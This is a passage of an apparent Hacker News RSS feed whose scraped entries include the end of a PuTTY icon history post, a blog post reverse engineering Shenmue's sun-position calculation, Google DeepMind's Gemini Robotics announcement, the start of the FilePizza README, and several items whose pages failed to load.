        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/puttycfg.svg" alt="[puttycfg.svg]" width="192" height="192">
        </p>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/pterm.svg" alt="[pterm.svg]" width="192" height="192">
        </p>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/ptermcfg.svg" alt="[ptermcfg.svg]" width="192" height="192">
        </p>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/pscp.svg" alt="[pscp.svg]" width="192" height="192">
        </p>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/pageant.svg" alt="[pageant.svg]" width="192" height="192">
        </p>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/puttygen.svg" alt="[puttygen.svg]" width="192" height="192">
        </p>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/puttyins.svg" alt="[puttyins.svg]" width="192" height="192">
        </p>
      </div>
      <figcaption>All eight icons, in fully scalable SVG</figcaption>
    </figure>
    <p>For the tiny icons, I still think my original script is doing a
      better rendering job, because SVG has no idea at all how best to
      do that antialiasing. But for <em>large</em> icons, especially
      in true colour, I think my recommendation is going to be to base
      them on these SVGs – just render to a big bitmap.</p>
    <h2 id="eof">That’s all, folks!</h2>
    <p>That’s the history and the current state of the PuTTY icon set.</p>
    <p>People sometimes object to the entire 1990s styling, and
      volunteer to design us a complete set of replacements in a
      different style. We’ve never liked any of them enough to adopt
      them. I think that’s probably <em>because</em> the 1990s styling
      is part of what makes PuTTY what it is – “reassuringly
      old-fashioned”. I don’t know if there’s <em>any</em> major
      redesign that we’d really be on board with.</p>
    <p>So I expect by now we’re likely to keep these icons, or
      something basically the same, for the whole lifetime of the
      project!</p>
  

</div>]]></description>
        </item>
        <item>
            <title><![CDATA[Shenmue (1999) reverse engineering reveals possible sun position oversight (116 pts)]]></title>
            <link>https://wulinshu.com/2025/03/11/reverse-engineering-adventures-3-bug-or-not-bug/</link>
            <guid>43345285</guid>
            <pubDate>Wed, 12 Mar 2025 17:00:28 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://wulinshu.com/2025/03/11/reverse-engineering-adventures-3-bug-or-not-bug/">https://wulinshu.com/2025/03/11/reverse-engineering-adventures-3-bug-or-not-bug/</a>, See on <a href="https://news.ycombinator.com/item?id=43345285">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content">
		
<p>So far, we’ve only really touched on some of the fundamentals of reverse engineering with one game example, but this time we’re looking at something a bit different.</p>



<p>Shenmue (1999) is widely known for its pursuit of realism and has remained an influential series to this day, with its third game releasing in 2019. This pursuit of realism wasn’t unintentional, but one of the key design choices they made early on in development. With 2 cult classic hits on the SEGA Dreamcast, in this post, we’ll look at some code in the game which reveals a mystery and how reverse engineering can be used to understand exactly how the game attempts to capture the essence of realism, and maybe even the original developers intentions..</p>







<h2>Logic</h2>



<p>Generally speaking, the concepts behind reverse engineering actual logic remains roughly the same. We have to reason with the code we see and try to apply that reasoning to the code. Machines don’t execute C code, they read and execute machine code, of which was generated during the lossy process of compilation itself. This creates something of an interesting place for reverse engineers and interested developers alike, as the skill of being able to reverse engineer some code, or data, even a bug, ultimately builds your skillset as a developer and thus can lead you into different career paths. An obvious example is security: malware reverse engineering and other areas of the cybersecurity field have an inherent desire to be able to identify exactly what a piece of code is doing. </p>



<p>Functions are transformed from their C source code into “machine code”, which is the assembled form of assembly instructions. This process, of C source code being transformed into assembly and then assembled into machine code, is a lossy process inherently. Thus, while attempting to reverse engineer logic, we often find that the underlying code has been slightly altered from its original form, in an effort to make the code more performant. </p>



<p>With this in mind, depending on the original source code, the compiler and toolchain being used, and some other factors, it can be challenging to truly understand the developers original intentions, especially since all variable, function names and comments are usually always removed as part of compilation and we must recreate these as much as we can ourselves. This is the most complex form of reverse engineering and a lot of time, effort and patience are what pay off the most. </p>



<h2>The Mystery</h2>



<p>In real life, the Earth’s axial tilt plays a crucial role in determining the suns position at any given time of the year. </p>



<figure><img fetchpriority="high" decoding="async" width="706" height="402" src="https://wulinshu.com/wp-content/uploads/2025/03/Planet_axis_comparison.png" alt="Credits to Wikipedia for this!" srcset="https://wulinshu.com/wp-content/uploads/2025/03/Planet_axis_comparison.png 706w, https://wulinshu.com/wp-content/uploads/2025/03/Planet_axis_comparison-300x171.png 300w" sizes="(max-width: 706px) 100vw, 706px"></figure>



<p>In Shenmue, simulating everything would be a tall order, but with this they can certainly get most of the way there. In the game, there is a heavy emphasis on keeping to a schedule and the minutae of daily life, and this is evidenced in the below logic, which we’ll dissect.</p>



<figure><img decoding="async" width="1024" height="774" src="https://wulinshu.com/wp-content/uploads/2025/03/Glv880MX0AAIB8F-1024x774.jpg" alt="" srcset="https://wulinshu.com/wp-content/uploads/2025/03/Glv880MX0AAIB8F-1024x774.jpg 1024w, https://wulinshu.com/wp-content/uploads/2025/03/Glv880MX0AAIB8F-300x227.jpg 300w, https://wulinshu.com/wp-content/uploads/2025/03/Glv880MX0AAIB8F-768x580.jpg 768w, https://wulinshu.com/wp-content/uploads/2025/03/Glv880MX0AAIB8F.jpg 1055w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<pre><code></code></pre>



<div><p>This is the result of many hours of reverse engineering sessions and discovered a while ago, we noticed something quite interesting. For the purposes of demonstration, I’ve omitted certain things, this will become clear later on in the post. </p><p>As stated before, the game is heavily based around daily life and as such, I discovered that this code was responsible for calculating the suns position and direction, for the purposes of lighting the scene. Reversing is inherently an iterative process — as you progress, your understandings may change about a previous function or some piece of data — and as such the screenshot above shows what my understanding was at the time.</p></div>



<figure><img decoding="async" width="1024" height="43" src="https://wulinshu.com/wp-content/uploads/2025/03/image-1024x43.png" alt="" srcset="https://wulinshu.com/wp-content/uploads/2025/03/image-1024x43.png 1024w, https://wulinshu.com/wp-content/uploads/2025/03/image-300x13.png 300w, https://wulinshu.com/wp-content/uploads/2025/03/image-768x32.png 768w, https://wulinshu.com/wp-content/uploads/2025/03/image-1536x64.png 1536w, https://wulinshu.com/wp-content/uploads/2025/03/image.png 1677w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>This line is converting the current time into a rotation, we know this because DEG_TO_RAD, in this case, is π over 180: a common method for converting degrees into radians. But what is 12 and -15? </p>



<p>Moving onto the next line, we essentially have more confirmation that this value is a rotation value, as it is passed into <code>sin</code>, after being subtracted by <code>HALF_PI</code>. We progress onto the next line, which is where the meat of the calculation takes place.</p>



<figure><img loading="lazy" decoding="async" width="1024" height="143" src="https://wulinshu.com/wp-content/uploads/2025/03/image-3-1024x143.png" alt="" srcset="https://wulinshu.com/wp-content/uploads/2025/03/image-3-1024x143.png 1024w, https://wulinshu.com/wp-content/uploads/2025/03/image-3-300x42.png 300w, https://wulinshu.com/wp-content/uploads/2025/03/image-3-768x107.png 768w, https://wulinshu.com/wp-content/uploads/2025/03/image-3-1536x215.png 1536w, https://wulinshu.com/wp-content/uploads/2025/03/image-3.png 1824w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<div><p>This line condenses quite a bit of logic and we get more confirmation that this is a rotation being built up, through the heavy use of π and moving in and out of degrees. There’s something peculiar here, though. </p><p>The magic numbers so far have mostly made sense, especially given their use with <code>sin</code>. But now we have 365.0 to add to our mystery number list, and an array:</p></div>



<figure><img loading="lazy" decoding="async" width="1024" height="86" src="https://wulinshu.com/wp-content/uploads/2025/03/image-4-1024x86.png" alt="" srcset="https://wulinshu.com/wp-content/uploads/2025/03/image-4-1024x86.png 1024w, https://wulinshu.com/wp-content/uploads/2025/03/image-4-300x25.png 300w, https://wulinshu.com/wp-content/uploads/2025/03/image-4-768x65.png 768w, https://wulinshu.com/wp-content/uploads/2025/03/image-4.png 1220w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>This array is being accessed directly by the current month and, upon closer inspection, we can also see 365 at the end of the array and it seems that this array is in fact an array that maps the accumulated days within a year for each month. There are 12 numbers, each one representing the total number of days that have passed for that month. We’ll rename this array to <code>g_accum_days</code> to reflect our current research.</p>



<p>Now we’ve gained a little bit of a clearer picture as to what is happening here, part of the expression from the last line of code is calculating how far along the game currently is into the year:</p>



<p><code>g_accum_days[month-1] - day / 365</code></p>



<p>in which it is then converted into a rotation with the help of a couple more magic numbers. </p>







<p>Just like in previous posts, at this point, a new theory was emerging: it seems as though the game is performing a calculation that derives the suns position based on the games current progression into the year, by approximating its axial tilt, roughly 23.4°. </p>











<h2>The Second Iteration</h2>



<p>It’s just a theory so far, and we’ve only looked at <em>Shenmue</em>, but AM2 also released <em>Shenmue II</em> shortly after and, given that both games share the same philosophies, perhaps if we delve into its implementation, we can spot some differences and hopefully clear up the remaining mysteries behind the rest of the magic numbers. </p>



<p>Before looking at its actual code implementation, we confirm and rename the day accumulation array. It’s exactly the same as the first game, but how it is being used shows something else:</p>



<figure><img loading="lazy" decoding="async" width="1024" height="76" src="https://wulinshu.com/wp-content/uploads/2025/03/image-5-1024x76.png" alt="" srcset="https://wulinshu.com/wp-content/uploads/2025/03/image-5-1024x76.png 1024w, https://wulinshu.com/wp-content/uploads/2025/03/image-5-300x22.png 300w, https://wulinshu.com/wp-content/uploads/2025/03/image-5-768x57.png 768w, https://wulinshu.com/wp-content/uploads/2025/03/image-5.png 1466w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>This line shows an extra statement within the calculation from the first game. Now, instead of <strong>202</strong>, the game is now directly referencing the 5th element of the day accumulation array. Checking over the value of the 5th element gives us 181. This could have resulted in a slightly off approximation of the summer solstice, which occurs around day ~172 within the year. However, it is more than likely that the code was refactored to directly reference this within the day accumulation array. </p>











<p>Initially we thought that this could be a bug, but despite the omission of 202, the 2 implementations remain somewhat equivalent…</p>



<figure><img loading="lazy" decoding="async" width="1024" height="212" src="https://wulinshu.com/wp-content/uploads/2025/03/image-6-1024x212.png" alt="" srcset="https://wulinshu.com/wp-content/uploads/2025/03/image-6-1024x212.png 1024w, https://wulinshu.com/wp-content/uploads/2025/03/image-6-300x62.png 300w, https://wulinshu.com/wp-content/uploads/2025/03/image-6-768x159.png 768w, https://wulinshu.com/wp-content/uploads/2025/03/image-6-1536x319.png 1536w, https://wulinshu.com/wp-content/uploads/2025/03/image-6.png 1774w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Some of the changes we see here are likely part compiler optimisations and the code being changed. </p>



<p>First, the game is essentially converting time into a rotation, where noon (12pm) is directly above and each hour represents 15 degrees, known as the solar time angle. The game then approximates the earths axial tilt, with a given latitude <code>tiltAngle</code>, based on the Earth’s tilt, 23.5°.</p>



<p>This step essentially allows the game to simulate the sun’s position as realistically as possible based on the current date and time.. and a given latitude. </p>







<h2>Findings</h2>



<p>To wrap all of this up, we’ve discovered that the game is correctly approximating the suns position in a way which aligns with the design goals and philosophies of one of gamings most beloved franchises. But up until this point, I’ve refrained from showing one key variable: <code>tiltAngle</code></p>



<p>In order to perform this calculation, you need the latitude, and since <em>Shenmue</em> is based in Yokosuka, Japan, it would make sense that the latitude used for this calculation would be 35°, and <em>Shenmue II</em> as 22°, <a href="https://en.wikipedia.org/wiki/List_of_national_capitals_by_latitude">just as it is in real-life</a>. <br></p>



<p><strong>However, in this case, it appears as though this could be quite literally reversed (pun intended)</strong>:</p>



<p><strong><em>Shenmue I</em></strong></p>



<figure><img loading="lazy" decoding="async" width="1024" height="82" src="https://wulinshu.com/wp-content/uploads/2025/03/image-8-1024x82.png" alt="" srcset="https://wulinshu.com/wp-content/uploads/2025/03/image-8-1024x82.png 1024w, https://wulinshu.com/wp-content/uploads/2025/03/image-8-300x24.png 300w, https://wulinshu.com/wp-content/uploads/2025/03/image-8-768x61.png 768w, https://wulinshu.com/wp-content/uploads/2025/03/image-8.png 1142w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p><strong><em>Shenmue II</em></strong></p>



<figure><img loading="lazy" decoding="async" width="899" height="62" src="https://wulinshu.com/wp-content/uploads/2025/03/image-7.png" alt="" srcset="https://wulinshu.com/wp-content/uploads/2025/03/image-7.png 899w, https://wulinshu.com/wp-content/uploads/2025/03/image-7-300x21.png 300w, https://wulinshu.com/wp-content/uploads/2025/03/image-7-768x53.png 768w" sizes="(max-width: 899px) 100vw, 899px"></figure>



<p>Ultimately, it is impossible to tell without clarification from the developer in this instance, but the intent here is to show how reverse engineering code is an iterative process and your understanding of the original logic is always changing the more you look into the details. </p>



<p>I hope you found this post informative and was as interesting to read as it was for me to dedicate large amounts of time reverse engineering these games. If you’ve never checked them out, I strongly suggest doing so.</p>



<p>Full code will be made available in the not too distant future.</p>
































		
			</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The cultural divide between mathematics and AI (152 pts)]]></title>
            <link>https://sugaku.net/content/understanding-the-cultural-divide-between-mathematics-and-ai/</link>
            <guid>43344703</guid>
            <pubDate>Wed, 12 Mar 2025 16:07:35 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://sugaku.net/content/understanding-the-cultural-divide-between-mathematics-and-ai/">https://sugaku.net/content/understanding-the-cultural-divide-between-mathematics-and-ai/</a>, See on <a href="https://news.ycombinator.com/item?id=43344703">Hacker News</a></p>
Couldn't get https://sugaku.net/content/understanding-the-cultural-divide-between-mathematics-and-ai/: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Reverse Engineering OpenAI Code Execution to make it run C and JavaScript (185 pts)]]></title>
            <link>https://twitter.com/benswerd/status/1899853533761200300</link>
            <guid>43344673</guid>
            <pubDate>Wed, 12 Mar 2025 16:04:54 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://twitter.com/benswerd/status/1899853533761200300">https://twitter.com/benswerd/status/1899853533761200300</a>, See on <a href="https://news.ycombinator.com/item?id=43344673">Hacker News</a></p>
Couldn't get https://twitter.com/benswerd/status/1899853533761200300: Error: Request failed with status code 400]]></description>
        </item>
        <item>
            <title><![CDATA[The 2005 Sony Bravia ad (241 pts)]]></title>
            <link>https://www.sfgate.com/sf-culture/article/san-francisco-sony-bouncy-ball-ad-20204385.php</link>
            <guid>43344129</guid>
            <pubDate>Wed, 12 Mar 2025 15:12:44 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.sfgate.com/sf-culture/article/san-francisco-sony-bouncy-ball-ad-20204385.php">https://www.sfgate.com/sf-culture/article/san-francisco-sony-bouncy-ball-ad-20204385.php</a>, See on <a href="https://news.ycombinator.com/item?id=43344129">Hacker News</a></p>
Couldn't get https://www.sfgate.com/sf-culture/article/san-francisco-sony-bouncy-ball-ad-20204385.php: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Gemini Robotics brings AI into the physical world (602 pts)]]></title>
            <link>https://deepmind.google/discover/blog/gemini-robotics-brings-ai-into-the-physical-world/</link>
            <guid>43344082</guid>
            <pubDate>Wed, 12 Mar 2025 15:09:09 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://deepmind.google/discover/blog/gemini-robotics-brings-ai-into-the-physical-world/">https://deepmind.google/discover/blog/gemini-robotics-brings-ai-into-the-physical-world/</a>, See on <a href="https://news.ycombinator.com/item?id=43344082">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content">
      
  <article>
    
    
  
  
  
    
      

      
      
        
          
            <div>
              
                
                
                  
                  
<div>
    <div>
      <p>Research</p>
      

      
    <dl>
      
        <dt>Published</dt>
        <dd><time datetime="2025-03-12">12 March 2025</time></dd>
      
      
        <dt>Authors</dt>
        
      
    </dl>
  

      
    </div>

    
      
    
    
    <picture>
      <source media="(min-width: 1024px)" type="image/webp" width="1072" height="603" srcset="https://lh3.googleusercontent.com/I3LyOcpijrKfJ90UteiAN9ny73Ly-eNb2l3vsC6fOtl3UQKKufCzgeZMh26--7nV36oTUOk9B7B4FIhCKrVYAksGW2DVcviQoWL5BmErDNsIMiX7AQ=w1072-h603-n-nu-rw 1x, https://lh3.googleusercontent.com/I3LyOcpijrKfJ90UteiAN9ny73Ly-eNb2l3vsC6fOtl3UQKKufCzgeZMh26--7nV36oTUOk9B7B4FIhCKrVYAksGW2DVcviQoWL5BmErDNsIMiX7AQ=w2144-h1206-n-nu-rw 2x"><source media="(min-width: 600px)" type="image/webp" width="928" height="522" srcset="https://lh3.googleusercontent.com/I3LyOcpijrKfJ90UteiAN9ny73Ly-eNb2l3vsC6fOtl3UQKKufCzgeZMh26--7nV36oTUOk9B7B4FIhCKrVYAksGW2DVcviQoWL5BmErDNsIMiX7AQ=w928-h522-n-nu-rw 1x, https://lh3.googleusercontent.com/I3LyOcpijrKfJ90UteiAN9ny73Ly-eNb2l3vsC6fOtl3UQKKufCzgeZMh26--7nV36oTUOk9B7B4FIhCKrVYAksGW2DVcviQoWL5BmErDNsIMiX7AQ=w1856-h1044-n-nu-rw 2x"><source type="image/webp" width="528" height="297" srcset="https://lh3.googleusercontent.com/I3LyOcpijrKfJ90UteiAN9ny73Ly-eNb2l3vsC6fOtl3UQKKufCzgeZMh26--7nV36oTUOk9B7B4FIhCKrVYAksGW2DVcviQoWL5BmErDNsIMiX7AQ=w528-h297-n-nu-rw 1x, https://lh3.googleusercontent.com/I3LyOcpijrKfJ90UteiAN9ny73Ly-eNb2l3vsC6fOtl3UQKKufCzgeZMh26--7nV36oTUOk9B7B4FIhCKrVYAksGW2DVcviQoWL5BmErDNsIMiX7AQ=w1056-h594-n-nu-rw 2x">
      <img alt="Hands from the Robot’s POV. A pair of robotic hands move tiles into the word ‘world’ under the text ‘Gemini for the Physical’." height="603" src="https://lh3.googleusercontent.com/I3LyOcpijrKfJ90UteiAN9ny73Ly-eNb2l3vsC6fOtl3UQKKufCzgeZMh26--7nV36oTUOk9B7B4FIhCKrVYAksGW2DVcviQoWL5BmErDNsIMiX7AQ=w1072-h603-n-nu" width="1072">
    </picture>
    
  
    
  </div>
                
              
                
                
                  
                  <div>
  <p data-block-key="q2c97">Introducing Gemini Robotics, our Gemini 2.0-based model designed for robotics</p><p data-block-key="3djrg">At Google DeepMind, we've been making progress in how our Gemini models solve complex problems through multimodal reasoning across text, images, audio and video. So far however, those abilities have been largely confined to the digital realm. In order for AI to be useful and helpful to people in the physical realm, they have to demonstrate “embodied” reasoning — the humanlike ability to comprehend and react to the world around us— as well as safely take action to get things done.</p><p data-block-key="73qu7">Today, we are introducing two new AI models, based on Gemini 2.0, which lay the foundation for a new generation of helpful robots.</p><p data-block-key="4he0s">The first is Gemini Robotics, an advanced vision-language-action (VLA) model that was built on Gemini 2.0 with the addition of physical actions as a new output modality for the purpose of directly controlling robots. The second is Gemini Robotics-ER, a Gemini model with advanced spatial understanding, enabling roboticists to run their own programs using Gemini’s embodied reasoning (ER) abilities.</p><p data-block-key="dtsn7">Both of these models enable a variety of robots to perform a wider range of real-world tasks than ever before. As part of our efforts, we’re partnering with Apptronik to build the next generation of humanoid robots with Gemini 2.0. We’re also working with a selected number of trusted testers to guide the future of Gemini Robotics-ER.</p><p data-block-key="im3d">We look forward to exploring our models’ capabilities and continuing to develop them on the path to real-world applications.</p>
</div>
                
              
                
                
                  
                  





<figure aria-labelledby="caption-c0fc8135-59e8-4260-bd69-d04865397c8d">
  

  <figcaption>
      <p data-block-key="xzn4c">A summary of our efforts</p>
    </figcaption>
</figure>
                
              
                
                
                  
                  <div>
  <h2 data-block-key="2q7pg">Gemini Robotics: Our most advanced vision-language-action model</h2><p data-block-key="3d8qf">To be useful and helpful to people, AI models for robotics need three principal qualities: they have to be general, meaning they’re able to adapt to different situations; they have to be interactive, meaning they can understand and respond quickly to instructions or changes in their environment; and they have to be dexterous, meaning they can do the kinds of things people generally can do with their hands and fingers, like carefully manipulate objects.</p><p data-block-key="5bthq">While our previous work demonstrated progress in these areas, Gemini Robotics represents a substantial step in performance on all three axes, getting us closer to truly general purpose robots.</p><p data-block-key="2bhs2"><strong>Generality</strong></p><p data-block-key="at04h">Gemini Robotics leverages Gemini's world understanding to generalize to novel situations and solve a wide variety of tasks out of the box, including tasks it has never seen before in training. Gemini Robotics is also adept at dealing with new objects, diverse instructions, and new environments. In <a href="https://storage.googleapis.com/deepmind-media/gemini-robotics/gemini_robotics_report.pdf" rel="noopener" target="_blank">our tech report</a>, we show that on average, Gemini Robotics more than doubles performance on a comprehensive generalization benchmark compared to other state-of-the-art vision-language-action models.</p>
</div>
                
              
                
                
                  
                  





<figure aria-labelledby="caption-f629fa4d-725a-4e13-b06f-958a3b6ff6f3">
  

  <figcaption>
      <p data-block-key="t82k8">A demonstration of Gemini Robotics’s world understanding.</p>
    </figcaption>
</figure>
                
              
                
                
                  
                  <div>
  <p data-block-key="2q7pg"><strong>Interactivity</strong></p><p data-block-key="5merb">To operate in our dynamic, physical world, robots must be able to seamlessly interact with people and their surrounding environment, and adapt to changes on the fly.</p><p data-block-key="lvkr">Because it’s built on a foundation of Gemini 2.0, Gemini Robotics is intuitively interactive. It taps into Gemini’s advanced language understanding capabilities and can understand and respond to commands phrased in everyday, conversational language and in different languages.</p><p data-block-key="eo201">It can understand and respond to a much broader set of natural language instructions than our previous models, adapting its behavior to your input. It also continuously monitors its surroundings, detects changes to its environment or instructions, and adjusts its actions accordingly. This kind of control, or “steerability,” can better help people collaborate with robot assistants in a range of settings, from home to the workplace.</p>
</div>
                
              
                
                
                  
                  





<figure aria-labelledby="caption-47d85e98-c673-4ad9-a46e-da921cb43b9b">
  

  <figcaption>
      <p data-block-key="a6zg7">If an object slips from its grasp, or someone moves an item around, Gemini Robotics quickly replans and carries on — a crucial ability for robots in the real world, where surprises are the norm.</p>
    </figcaption>
</figure>
                
              
                
                
                  
                  <div>
  <p data-block-key="2q7pg"><strong>Dexterity</strong></p><p data-block-key="ev4ji">The third key pillar for building a helpful robot is acting with <a href="https://deepmind.google/discover/blog/advances-in-robot-dexterity/" rel="noopener" target="_blank">dexterity</a>. Many everyday tasks that humans perform effortlessly require surprisingly fine motor skills and are still too difficult for robots. By contrast, Gemini Robotics can tackle extremely complex, multi-step tasks that require precise manipulation such as origami folding or packing a snack into a Ziploc bag.</p>
</div>
                
              
                
                
                  
                  





<figure aria-labelledby="caption-b9331385-f6f6-44b8-9a78-12992940d893">
  

  <figcaption>
      <p data-block-key="ex5b9">Gemini Robotics displays advanced levels of dexterity</p>
    </figcaption>
</figure>
                
              
                
                
                  
                  <div>
  <p data-block-key="2q7pg"><strong>Multiple embodiments</strong></p><p data-block-key="2co1s">Finally, because robots come in all shapes and sizes, Gemini Robotics was also designed to easily adapt to different robot types. We trained the model primarily on data from the bi-arm robotic platform, <a href="https://aloha-2.github.io/" rel="noopener" target="_blank">ALOHA 2</a>, but we also demonstrated that it could control a bi-arm platform, based on the Franka arms used in many academic labs. Gemini Robotics can even be specialized for more complex embodiments, such as the humanoid Apollo robot developed by Apptronik, with the goal of completing real world tasks.</p>
</div>
                
              
                
                
                  
                  





<figure aria-labelledby="caption-7373c1b3-efa4-4519-8053-d36df232fd8f">
  

  <figcaption>
      <p data-block-key="xnqp1">Gemini Robotics works on different kinds of robots</p>
    </figcaption>
</figure>
                
              
                
                
                  
                  <div>
  <h2 data-block-key="2q7pg">Enhancing Gemini’s world understanding</h2><p data-block-key="f1glf"><br>Alongside Gemini Robotics, we’re introducing an advanced vision-language model called Gemini Robotics-ER (short for ‘“embodied reasoning”). This model enhances Gemini’s understanding of the world in ways necessary for robotics, focusing especially on spatial reasoning, and allows roboticists to connect it with their existing low level controllers.</p><p data-block-key="6k4gb">Gemini Robotics-ER improves Gemini 2.0’s existing abilities like pointing and 3D detection by a large margin. Combining spatial reasoning and Gemini’s coding abilities, Gemini Robotics-ER can instantiate entirely new capabilities on the fly. For example, when shown a coffee mug, the model can intuit an appropriate two-finger grasp for picking it up by the handle and a safe trajectory for approaching it.</p><p data-block-key="1lam2">Gemini Robotics-ER can perform all the steps necessary to control a robot right out of the box, including perception, state estimation, spatial understanding, planning and code generation. In such an end-to-end setting the model achieves a 2x-3x success rate compared to Gemini 2.0. And where code generation is not sufficient, Gemini Robotics-ER can even tap into the power of in-context learning, following the patterns of a handful of human demonstrations to provide a solution.</p>
</div>
                
              
                
                
                  
                  





<figure aria-labelledby="caption-b5cc8c3f-baf6-4ee6-ae2f-4c3c8d9630a8">
  

  <figcaption>
      <p data-block-key="jgf1i">Gemini Robotics-ER excels at embodied reasoning capabilities including detecting objects and pointing at object parts, finding corresponding points and detecting objects in 3D.</p>
    </figcaption>
</figure>
                
              
                
                
                  
                  <div>
  <h2 data-block-key="2q7pg">Responsibly advancing AI and robotics<br></h2><p data-block-key="16hbn">As we explore the continuing potential of AI and robotics, we’re taking a layered, <a href="https://sites.google.com/corp/view/safe-robots" rel="noopener" target="_blank">holistic</a> approach to addressing safety in our research, from low-level motor control to high-level semantic understanding.</p><p data-block-key="7s8sj">The physical safety of robots and the people around them is a longstanding, foundational concern in the science of robotics. That's why roboticists have classic safety measures such as avoiding collisions, limiting the magnitude of contact forces, and ensuring the dynamic stability of mobile robots. Gemini Robotics-ER can be interfaced with these ‘low-level’ safety-critical controllers, specific to each particular embodiment. Building on Gemini’s core safety features, we enable Gemini Robotics-ER models to understand whether or not a potential action is safe to perform in a given context, and to generate appropriate responses.</p><p data-block-key="3dcnu">To advance robotics safety research across academia and industry, we are also releasing a new dataset to evaluate and improve semantic safety in embodied AI and robotics. In previous work, we showed how a <a href="https://deepmind.google/discover/blog/shaping-the-future-of-advanced-robotics/" rel="noopener" target="_blank">Robot Constitution</a> inspired by Isaac Asimov’s Three Laws of Robotics could help prompt an LLM to select safer tasks for robots. We have since developed a framework to automatically generate data-driven constitutions - rules expressed directly in natural language – to steer a robot’s behavior. This framework would allow people to create, modify and apply constitutions to develop robots that are safer and more aligned with human values. Finally, the <a href="https://asimov-benchmark.github.io/" rel="noopener" target="_blank">new ASIMOV dataset</a> will help researchers to rigorously measure the safety implications of robotic actions in real-world scenarios.</p><p data-block-key="ch213">To further assess the societal implications of our work, we collaborate with experts in our Responsible Development and Innovation team and as well as our Responsibility and Safety Council, an internal review group committed to ensure we develop AI applications responsibly. We also consult with external specialists on particular challenges and opportunities presented by embodied AI in robotics applications.</p><p data-block-key="cis52">In addition to our partnership with Apptronik, our Gemini Robotics-ER model is also available to trusted testers including Agile Robots, Agility Robots, Boston Dynamics, and Enchanted Tools. We look forward to exploring our models’ capabilities and continuing to develop AI for the next generation of more helpful robots.</p>
</div>
                
              
                
                
                  
                  

<section>
  

  <ul>
    
      <li>
            <gemini-button data-in-view="">
              <a data-gtm-tag="cta-selection" href="https://storage.googleapis.com/deepmind-media/gemini-robotics/gemini_robotics_report.pdf" rel="noopener" target="_blank">
      <span>Read our paper</span>
      
    </a>
            </gemini-button>
        </li>
        
    
      <li>
            <gemini-button data-in-view="">
              <a data-gtm-tag="cta-selection" href="https://deepmind.google/technologies/gemini-robotics/" aria-label="https://deepmind.google/technologies/gemini-robotics/">
      <span>Gemini Robotics</span>
      
    </a>
            </gemini-button>
        </li>
        
    
  </ul>
</section>
                
              
                
                
                  
                  <div>
  <h2 data-block-key="2q7pg">Acknowledgements</h2><p data-block-key="duspu">This work was developed by the Gemini Robotics team. For a full list of authors and acknowledgements please view <a href="https://storage.googleapis.com/deepmind-media/gemini-robotics/gemini_robotics_report.pdf" rel="noopener" target="_blank">our technical report</a>.</p>
</div>
                
              
            </div>
          
        
      

      
    
  
  

  

  </article>

    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The DuckDB Local UI (598 pts)]]></title>
            <link>https://duckdb.org/2025/03/12/duckdb-ui.html</link>
            <guid>43342712</guid>
            <pubDate>Wed, 12 Mar 2025 12:56:01 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://duckdb.org/2025/03/12/duckdb-ui.html">https://duckdb.org/2025/03/12/duckdb-ui.html</a>, See on <a href="https://news.ycombinator.com/item?id=43342712">Hacker News</a></p>
Couldn't get https://duckdb.org/2025/03/12/duckdb-ui.html: Error: timeout of 10000ms exceeded]]></description>
        </item>
        <item>
            <title><![CDATA[Peer-to-peer file transfers in the browser (395 pts)]]></title>
            <link>https://github.com/kern/filepizza</link>
            <guid>43342361</guid>
            <pubDate>Wed, 12 Mar 2025 12:08:43 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/kern/filepizza">https://github.com/kern/filepizza</a>, See on <a href="https://news.ycombinator.com/item?id=43342361">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><a href="https://xkcd.com/949/" rel="nofollow"><img src="https://camo.githubusercontent.com/dbaa632801e564800edb58e1fd300604cae6ba5784adf8b6bab89935e1453147/687474703a2f2f696d67732e786b63642e636f6d2f636f6d6963732f66696c655f7472616e736665722e706e67" alt="XKCD 949" width="30%" data-canonical-src="http://imgs.xkcd.com/comics/file_transfer.png"></a> <a target="_blank" rel="noopener noreferrer" href="https://github.com/kern/filepizza/blob/main/public/images/wordmark.png"><img src="https://github.com/kern/filepizza/raw/main/public/images/wordmark.png" alt="FilePizza wordmark" width="50%"></a> </p><p dir="auto"><h3 tabindex="-1" dir="auto">Peer-to-peer file transfers in your browser</h3><a id="user-content-peer-to-peer-file-transfers-in-your-browser" aria-label="Permalink: Peer-to-peer file transfers in your browser" href="#peer-to-peer-file-transfers-in-your-browser"></a></p>
<p dir="auto"><em>Cooked up by <a href="https://kern.io/" rel="nofollow">Alex Kern</a> &amp; <a href="https://github.com/neerajbaid">Neeraj Baid</a> while eating Sliver @ UC Berkeley.</em></p>
